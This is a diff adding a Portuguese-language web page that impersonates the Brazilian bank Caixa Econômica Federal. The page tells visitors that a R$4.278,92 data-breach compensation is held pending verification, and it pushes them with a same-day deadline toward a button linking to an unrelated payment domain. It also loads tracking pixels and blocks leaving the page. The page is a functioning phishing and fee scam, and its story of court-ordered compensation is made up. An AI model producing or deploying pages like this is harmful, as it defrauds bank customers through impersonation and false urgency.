@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compensação Financeira - CAIXA</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+  
+</head>
+<body class="flex items-center justify-center min-h-screen p-4 bg-gradient-to-br from-cyan-600 to-blue-900">
+
+    <div class="bg-white max-w-sm mx-auto p-6 rounded-2xl shadow-2xl">
+
+        <div class="flex justify-center mb-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png" alt="Logo da Caixa Econômica Federal" class="h-12 w-auto">
+        </div>
+
+        <h1 class="text-xl font-extrabold text-center text-gray-800 mb-6 border-b pb-2">
+            Verificação de Indenização
+        </h1>
+
+        <div class="flex items-center justify-center mb-6">
+            <div class="flex items-center bg-yellow-100 px-4 py-2 rounded-xl">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-yellow-600 mr-2" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <polyline points="12 6 12 12 16 14" />
+                </svg>
+                <p class="font-bold text-lg text-yellow-600">PENDENTE DE LIBERAÇÃO</p>
+            </div>
+        </div>
+
+        <div class="space-y-4">
+            <p class="text-gray-700 leading-relaxed">
+                Após a confirmação do seu direito ao crédito no valor de <strong class="text-red-600 font-extrabold text-xl">R$4.278,92</strong>, identificamos que a compensação foi retida para verificação de segurança.
+            </p>
+
+            <p class="text-gray-700 leading-relaxed">
+                Esta retenção está relacionada à compensação financeira por incidente de segurança envolvendo vazamento de dados que afetou milhares de clientes durante o último trimestre. A Caixa Econômica Federal, em cumprimento às normas de proteção de dados e determinação judicial, está processando os valores devidos a cada cliente afetado.
+                <div class="mt-3 text-sm text-gray-600 space-y-1 bg-gray-50 p-3 rounded-lg border">
+                    <p class="font-bold text-gray-800">Detalhes do Crédito:</p>
+                    <p class="flex justify-between">
+                        <span>• Indenização Principal:</span> <span class="font-semibold text-gray-900">R$3.500,00</span>
+                    </p>
+                    <p class="flex justify-between">
+                        <span>• Juros e Correção Monetária:</span> <span class="font-semibold text-gray-900">R$778,92</span>
+                    </p>
+                </div>
+            </p>
+        </div>
+
+        <div class="mt-8">
+            <p class="text-gray-500 text-sm mb-4 flex items-center justify-center text-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2 text-gray-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/>
+                    <path d="M12 6v6l4 2"/>
+                </svg>
+                O prazo final para liberação é hoje! Clique abaixo para prosseguir com a verificação.
+            </p>
+            <a href="https://pay.confirmepagamentos.shop/PVYB34e495EZKzk" class="w-full inline-flex items-center justify-center px-6 py-4 border border-transparent text-lg font-bold rounded-full text-white bg-orange-600 hover:bg-orange-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-orange-500 transition-colors min-h-[56px] shadow-lg hover:shadow-xl transform hover:scale-105 duration-300">
+                LIBERAR INDENIZAÇÃO AGORA
+            </a>
+        </div>
+    </div>
+
+    <script>
+        function getNextPageIndex() {
+            let lastIndex = parseInt(localStorage.getItem('lastPageIndex')) || 1;
+            let nextIndex = (lastIndex % 3) + 1;
+            localStorage.setItem('lastPageIndex', nextIndex);
+            return nextIndex;
+        }
+
+        window.onbeforeunload = function() {
+            return 'Você está sendo redirecionado...';
+        };
+    </script>
+
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+
+
+<script>
+  window.pixelId = "68ef23cb4d4bf46efd3d88d4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+</body>
+</html>
